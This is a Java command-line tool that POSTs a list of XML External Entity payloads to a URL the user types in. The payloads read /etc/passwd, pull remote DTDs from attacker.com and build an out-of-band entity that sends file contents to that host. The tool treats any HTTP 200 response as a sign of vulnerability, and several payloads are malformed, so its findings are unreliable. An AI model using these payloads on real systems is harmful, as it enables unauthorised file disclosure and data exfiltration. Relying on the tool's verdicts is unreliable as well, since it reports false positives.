import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class XXETester {

    public static void main(String[] args) {
        System.out.println("XML External Entity (XXE) Vulnerability Tester\n");

        // Prompt user for target website URL
        System.out.print("Enter your target website URL: ");
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        String targetUrl;
        try {
            targetUrl = reader.readLine();
        } catch (IOException e) {
            System.out.println("Error reading input. Exiting...");
            return;
        }

        // Test for XXE vulnerability
        System.out.println("\nTesting for XXE vulnerability on: " + targetUrl);
        boolean vulnerable = testXXE(targetUrl);

        // Display results
        if (vulnerable) {
            System.out.println("\n[+] The target website may be vulnerable to XML External Entity (XXE)!");
            System.out.println("To confirm the vulnerability, try injecting custom XML payloads and observe the server's response.");
        } else {
            System.out.println("\n[-] The target website does not appear to be vulnerable to XML External Entity (XXE).");
        }
    }

    private static boolean testXXE(String targetUrl) {
        // Map of XML payloads to test
        Map<String, String> payloads = new HashMap<>();
        payloads.put("Classic XXE", "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>");
        payloads.put("Parameter Entity", "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY callhome SYSTEM \"www.example.com/?%xxe;\">]><test>&callhome;</test>");
        payloads.put("Blind Out-of-Band XXE", "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><foo></foo>");
        payloads.put("File Inclusion", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>");
        payloads.put("PHP Wrapper", "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>");
        payloads.put("XXE Inside SOAP", "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xxe=\"http://xml.evil.com/\"><soapenv:Header/><soapenv:Body><xxe:foo>&xxe;</xxe:foo></soapenv:Body></soapenv:Envelope>");
        payloads.put("Remote DTD", "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [<!ELEMENT data (#ANY)><!ENTITY % ext SYSTEM \"http://attacker.com/evil.dtd\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://attacker.com/?%ext;'>\"><!ENTITY % xxe \"<!ENTITY test SYSTEM 'file:///etc/passwd'>\"><!ENTITY root \"%param1;\"><!ENTITY % notused '<!ENTITY exfil SYSTEM \"http://attacker.com/?%ext;\">'>%notused;%xxe;%root;]>");

        for (Map.Entry<String, String> entry : payloads.entrySet()) {
            String payloadName = entry.getKey();
            String payload = entry.getValue();
            try {
                // Send HTTP request with the XML payload
                URL url = new URL(targetUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/xml");
                connection.setDoOutput(true);
                connection.getOutputStream().write(payload.getBytes());

                // Check HTTP response code
                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // If the response is successful, the website may be vulnerable
                    System.out.println("[*] Found potential XXE with payload: " + payloadName);
                    return true;
                }
            } catch (IOException e) {
                // Error occurred during HTTP request
                System.out.println("Error occurred: " + e.getMessage());
            }
        }
        return false;
    }
}
